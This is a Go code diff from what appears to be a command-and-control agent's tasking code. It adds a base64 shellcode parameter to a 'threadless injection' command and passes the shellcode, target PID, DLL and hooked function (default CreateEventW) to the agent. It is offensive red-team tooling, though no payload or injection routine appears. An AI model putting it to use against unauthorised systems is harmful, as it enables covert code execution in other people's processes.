@@ -58,8 +58,24 @@ func init() {
 				},
 			},
 			{
+				Name:             "shellcode_b64",
+				ModalDisplayName: "Shellcode (Base64)",
+				CLIName:          "shellcode_b64",
+				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
+				Description:      "Base64-encoded shellcode (for CLI/API usage)",
+				DefaultValue:     "",
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{
+						ParameterIsRequired: true,
+						GroupName:           "CLI",
+						UIModalPosition:     0,
+					},
+				},
+			},
+			{
 				Name:                 "pid",
 				ModalDisplayName:     "Process ID",
+				CLIName:              "pid",
 				ParameterType:        agentstructs.COMMAND_PARAMETER_TYPE_STRING,
 				Description:          "Target process ID to inject into",
 				DynamicQueryFunction: getProcessList,
@@ -75,11 +91,17 @@ func init() {
 						GroupName:           "New File",
 						UIModalPosition:     1,
 					},
+					{
+						ParameterIsRequired: true,
+						GroupName:           "CLI",
+						UIModalPosition:     1,
+					},
 				},
 			},
 			{
 				Name:             "dll_name",
 				ModalDisplayName: "DLL Name",
+				CLIName:          "dll_name",
 				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
 				Description:      "DLL containing the function to hook (e.g., kernelbase.dll)",
 				DefaultValue:     "kernelbase.dll",
@@ -94,11 +116,17 @@ func init() {
 						GroupName:           "New File",
 						UIModalPosition:     2,
 					},
+					{
+						ParameterIsRequired: false,
+						GroupName:           "CLI",
+						UIModalPosition:     2,
+					},
 				},
 			},
 			{
 				Name:             "function_name",
 				ModalDisplayName: "Function Name",
+				CLIName:          "function_name",
 				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
 				Description:      "Function to hook (e.g., CreateEventW)",
 				DefaultValue:     "CreateEventW",
@@ -111,6 +139,11 @@ func init() {
 					{
 						ParameterIsRequired: false,
 						GroupName:           "New File",
+						UIModalPosition:     3,
+					},
+					{
+						ParameterIsRequired: false,
+						GroupName:           "CLI",
 						UIModalPosition:     3,
 					},
 				},
@@ -153,12 +186,22 @@ func init() {
 				TaskID:  taskData.Task.ID,
 			}
 
-			// Resolve file contents by checking actual args (not ParameterGroupName)
-			filename, fileContents, err := resolveFileContents(taskData)
-			if err != nil {
-				response.Success = false
-				response.Error = err.Error()
-				return response
+			// Check for direct base64 shellcode first (CLI/API usage)
+			var shellcodeB64 string
+			var filename string
+			sc, _ := taskData.Args.GetStringArg("shellcode_b64")
+			if sc != "" {
+				shellcodeB64 = sc
+				filename = "(inline)"
+			} else {
+				fname, fileContents, fErr := resolveFileContents(taskData)
+				if fErr != nil {
+					response.Success = false
+					response.Error = fErr.Error()
+					return response
+				}
+				filename = fname
+				shellcodeB64 = base64.StdEncoding.EncodeToString(fileContents)
 			}
 
 			// Get the target PID
@@ -187,16 +230,23 @@ func init() {
 				functionName = fn
 			}
 
+			// Decode to get size for display
+			scBytes, decErr := base64.StdEncoding.DecodeString(shellcodeB64)
+			if decErr != nil {
+				response.Success = false
+				response.Error = "Failed to decode shellcode: " + decErr.Error()
+				return response
+			}
+
 			// Build the display parameters
 			displayParams := fmt.Sprintf("Shellcode: %s (%d bytes)\nTarget PID: %d\nDLL: %s\nFunction: %s",
-				filename, len(fileContents), pid, dllName, functionName)
+				filename, len(scBytes), pid, dllName, functionName)
 			response.DisplayParams = &displayParams
-			createArtifact(taskData.Task.ID, "Process Inject", fmt.Sprintf("Threadless injection into PID %d via %s!%s (%d bytes)", pid, dllName, functionName, len(fileContents)))
+			createArtifact(taskData.Task.ID, "Process Inject", fmt.Sprintf("Threadless injection into PID %d via %s!%s (%d bytes)", pid, dllName, functionName, len(scBytes)))
 
 			// Build the actual parameters JSON that will be sent to the agent
-			// Encode shellcode contents as base64 to embed in JSON
 			params := map[string]interface{}{
-				"shellcode_b64": base64.StdEncoding.EncodeToString(fileContents),
+				"shellcode_b64": shellcodeB64,
 				"pid":           pid,
 				"dll_name":      dllName,
 				"function_name": functionName,
